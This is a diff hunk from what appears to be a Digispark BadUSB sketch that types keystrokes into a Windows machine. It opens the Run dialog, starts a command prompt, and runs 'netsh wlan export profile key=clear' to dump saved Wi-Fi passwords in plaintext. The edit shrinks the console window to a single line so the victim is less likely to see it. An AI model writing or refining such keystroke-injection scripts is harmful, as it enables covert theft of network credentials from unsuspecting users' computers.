@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(300);  
-  DigiKeyboard.println("cmd");
+  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
   DigiKeyboard.delay(500);
   DigiKeyboard.println("netsh wlan export profile key=clear");
   DigiKeyboard.delay(500);
